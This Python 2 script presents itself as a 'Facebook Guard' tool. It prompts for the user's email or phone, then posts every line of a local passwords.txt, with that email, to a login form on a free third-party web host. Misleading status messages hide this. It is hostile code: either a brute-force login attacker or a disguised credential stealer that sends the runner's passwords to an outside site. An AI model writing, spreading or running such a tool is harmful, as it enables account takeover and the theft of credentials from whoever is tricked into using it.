#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import sys
import mechanize
import cookielib
import random



email =str(raw_input("Your Email Or Phone:"))


passwordlist = 'passwords.txt'


login = 'https://cyberbullet.000webhostapp.com/Fb%20Tool/ppguard.html'


useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def main():
	global br
	br = mechanize.Browser()
	cj = cookielib.LWPCookieJar()
	br.set_handle_robots(False)
	br.set_handle_redirect(True)
	br.set_cookiejar(cj)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	welcome()
	search()
	print("Something Was Wrong")

	
	
def brute(password):
	sys.stdout.write("\r[*] Trying .....")
	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['email'] = email
	br.form['pass'] = password
	sub = br.submit()
	log = sub.geturl()
	if log != login and (not 'login_attempt' in log):
			print("\n\n[+] You Have An Error In This Process")
			raw_input("ANY KEY to Exit....")
			sys.exit(1)

			
def search():
	global password
	passwords = open(passwordlist,"r")
	for password in passwords:
		password = password.replace("\n","")
		brute(password)

		
#welcome 
def welcome():
	wel = """

        +=========================================+
        |..........   Facebook Guard   ...........|
        +-----------------------------------------+
       \n\n
"""
	print wel 
	print " [*] Making, please wait ...\n\n"

	
if __name__ == '__main__':
	main()
